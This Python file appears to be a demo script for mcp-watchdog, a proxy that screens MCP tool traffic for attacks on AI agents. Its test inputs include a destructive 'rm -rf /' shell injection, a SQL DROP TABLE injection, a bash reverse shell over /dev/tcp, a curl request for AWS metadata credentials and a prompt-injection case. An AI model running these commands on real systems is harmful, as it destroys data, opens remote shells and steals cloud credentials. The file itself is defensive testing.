#!/usr/bin/env python3
"""mcp-watchdog live demo.

Starts the proxy wrapping a fake MCP server, sends real MCP traffic,
and shows what gets caught vs what passes through.

Usage:
    python demo.py
"""

import asyncio
import json
import os
import sys

FAKE_SERVER = os.path.join(os.path.dirname(__file__), "tests", "fake_mcp_server.py")
TIMEOUT = 5

# ANSI colors for output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


def banner(text):
    print(f"\n{BOLD}{CYAN}{'=' * 60}{RESET}")
    print(f"{BOLD}{CYAN}  {text}{RESET}")
    print(f"{BOLD}{CYAN}{'=' * 60}{RESET}\n")


def step(n, text):
    print(f"{BOLD}[{n}]{RESET} {text}")


def sent(msg):
    print(f"  {DIM}>> {json.dumps(msg)[:120]}...{RESET}")


def received(data):
    text = ""
    content = data.get("result", {}).get("content", [])
    for c in content:
        if c.get("type") == "text":
            text += c["text"]
    if text:
        print(f"  {GREEN}<< {text[:200]}{RESET}")
    else:
        result = data.get("result", {})
        name = result.get("serverInfo", {}).get("name", "")
        if name:
            print(f"  {GREEN}<< Server: {name}{RESET}")
        elif "tools" in result:
            names = [t["name"] for t in result["tools"]]
            print(f"  {GREEN}<< Tools: {', '.join(names)}{RESET}")
        else:
            print(f"  {GREEN}<< {json.dumps(data)[:120]}{RESET}")


def alert_found(stderr_text, rule):
    if rule in stderr_text:
        print(f"  {RED}!! ALERT: {rule} detected{RESET}")
        return True
    print(f"  {YELLOW}?? No {rule} alert found{RESET}")
    return False


def no_alert(stderr_text):
    if "ALERT" not in stderr_text:
        print(f"  {GREEN}.. No alerts (clean traffic){RESET}")
    else:
        print(f"  {YELLOW}?? Unexpected alert in clean traffic{RESET}")


async def send(proc, msg):
    proc.stdin.write((json.dumps(msg) + "\n").encode())
    await proc.stdin.drain()


async def recv(proc):
    line = await asyncio.wait_for(proc.stdout.readline(), timeout=TIMEOUT)
    return json.loads(line.decode().strip())


async def drain_stderr(proc, duration=0.3):
    text = ""
    deadline = asyncio.get_event_loop().time() + duration
    while asyncio.get_event_loop().time() < deadline:
        try:
            remaining = max(deadline - asyncio.get_event_loop().time(), 0.05)
            line = await asyncio.wait_for(proc.stderr.readline(), timeout=remaining)
            if line:
                text += line.decode("utf-8", errors="replace")
        except asyncio.TimeoutError:
            break
    return text


async def run_demo():
    banner("mcp-watchdog Live Demo")
    print("Starting proxy wrapping fake MCP server...\n")

    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "mcp_watchdog",
        "--", sys.executable, FAKE_SERVER,
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )

    await drain_stderr(proc, 1.0)

    results = {"passed": 0, "failed": 0}

    # --- 1. Initialize ---
    step(1, "MCP Initialize handshake")
    msg = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}}
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    await drain_stderr(proc)
    results["passed"] += 1

    # --- 2. Tools list ---
    step(2, "Fetch tool listing")
    msg = {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    await drain_stderr(proc)
    results["passed"] += 1

    # --- 3. Clean echo ---
    step(3, "Clean tool call (echo)")
    msg = {
        "jsonrpc": "2.0", "id": 3, "method": "tools/call",
        "params": {"name": "echo", "arguments": {"text": "Hello from the demo!"}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    stderr = await drain_stderr(proc)
    no_alert(stderr)
    results["passed"] += 1

    # --- Attack scenarios ---
    banner("Attack Scenarios")

    # --- 4. Prompt injection ---
    step(4, "ATTACK: Prompt injection via <IMPORTANT> block")
    msg = {
        "jsonrpc": "2.0", "id": 4, "method": "tools/call",
        "params": {"name": "attack_injection", "arguments": {}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    text = ""
    for c in resp.get("result", {}).get("content", []):
        if c.get("type") == "text":
            text += c["text"]
    if "<IMPORTANT>" not in text:
        print(f"  {GREEN}<< Injection STRIPPED: {text[:120]}{RESET}")
        results["passed"] += 1
    else:
        print(f"  {RED}<< Injection SURVIVED: {text[:120]}{RESET}")
        results["failed"] += 1
    stderr = await drain_stderr(proc)
    alert_found(stderr, "SMAC-5")

    # --- 5. Token leak ---
    step(5, "ATTACK: Credential leak (AWS key + GitHub PAT)")
    msg = {
        "jsonrpc": "2.0", "id": 5, "method": "tools/call",
        "params": {"name": "attack_token_leak", "arguments": {}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    text = ""
    for c in resp.get("result", {}).get("content", []):
        if c.get("type") == "text":
            text += c["text"]
    aws_redacted = "AKIAIOSFODNN7EXAMPLE" not in text
    ghp_redacted = "ghp_ABCDEFGHIJKLMNOP" not in text
    if aws_redacted and ghp_redacted:
        print(f"  {GREEN}<< Tokens REDACTED: {text[:120]}{RESET}")
        results["passed"] += 1
    else:
        leaked = []
        if not aws_redacted:
            leaked.append("AWS key")
        if not ghp_redacted:
            leaked.append("GitHub PAT")
        print(f"  {RED}<< LEAKED: {', '.join(leaked)}{RESET}")
        results["failed"] += 1
    stderr = await drain_stderr(proc)
    alert_found(stderr, "SMAC-6")

    # --- 6. Zero-width steganography ---
    step(6, "ATTACK: Zero-width character steganography")
    msg = {
        "jsonrpc": "2.0", "id": 6, "method": "tools/call",
        "params": {"name": "attack_zwsp", "arguments": {}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    text = ""
    for c in resp.get("result", {}).get("content", []):
        if c.get("type") == "text":
            text += c["text"]
    if "\u200b" not in text and "\u200c" not in text and "\u200d" not in text:
        print(f"  {GREEN}<< Zero-width chars STRIPPED: {text[:120]}{RESET}")
        results["passed"] += 1
    else:
        print(f"  {RED}<< Zero-width chars SURVIVED{RESET}")
        results["failed"] += 1
    stderr = await drain_stderr(proc)
    alert_found(stderr, "SMAC-1")

    # --- 7. Command injection ---
    step(7, "ATTACK: Shell command injection in tool arguments")
    msg = {
        "jsonrpc": "2.0", "id": 7, "method": "tools/call",
        "params": {"name": "echo", "arguments": {"text": "hello; rm -rf / --no-preserve-root"}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    stderr = await drain_stderr(proc)
    if alert_found(stderr, "CMD-INJECT"):
        results["passed"] += 1
    else:
        results["failed"] += 1

    # --- 8. SQL injection ---
    step(8, "ATTACK: SQL injection in tool arguments")
    msg = {
        "jsonrpc": "2.0", "id": 8, "method": "tools/call",
        "params": {"name": "echo", "arguments": {"text": "'; DROP TABLE users; --"}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    stderr = await drain_stderr(proc)
    if alert_found(stderr, "SQL-INJECT"):
        results["passed"] += 1
    else:
        results["failed"] += 1

    # --- 9. Reverse shell ---
    step(9, "ATTACK: Reverse shell in tool arguments")
    msg = {
        "jsonrpc": "2.0", "id": 9, "method": "tools/call",
        "params": {"name": "echo", "arguments": {"text": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}},
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    stderr = await drain_stderr(proc)
    if alert_found(stderr, "REVERSE-SHELL"):
        results["passed"] += 1
    else:
        results["failed"] += 1

    # --- 10. SSRF ---
    step(10, "ATTACK: SSRF via AWS metadata endpoint")
    msg = {
        "jsonrpc": "2.0", "id": 10, "method": "tools/call",
        "params": {
            "name": "echo",
            "arguments": {"text": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        },
    }
    sent(msg)
    await send(proc, msg)
    resp = await recv(proc)
    received(resp)
    stderr = await drain_stderr(proc)
    if alert_found(stderr, "SSRF"):
        results["passed"] += 1
    else:
        results["failed"] += 1

    # --- Summary ---
    banner("Results")
    total = results["passed"] + results["failed"]
    print(f"  {GREEN}Passed: {results['passed']}/{total}{RESET}")
    if results["failed"]:
        print(f"  {RED}Failed: {results['failed']}/{total}{RESET}")
    else:
        print(f"  {GREEN}All checks passed!{RESET}")

    try:
        proc.stdin.close()
    except Exception:
        pass
    try:
        await asyncio.wait_for(proc.wait(), timeout=3)
    except asyncio.TimeoutError:
        proc.kill()


def main():
    try:
        asyncio.run(run_demo())
    except KeyboardInterrupt:
        print(f"\n{DIM}Interrupted.{RESET}")


if __name__ == "__main__":
    main()
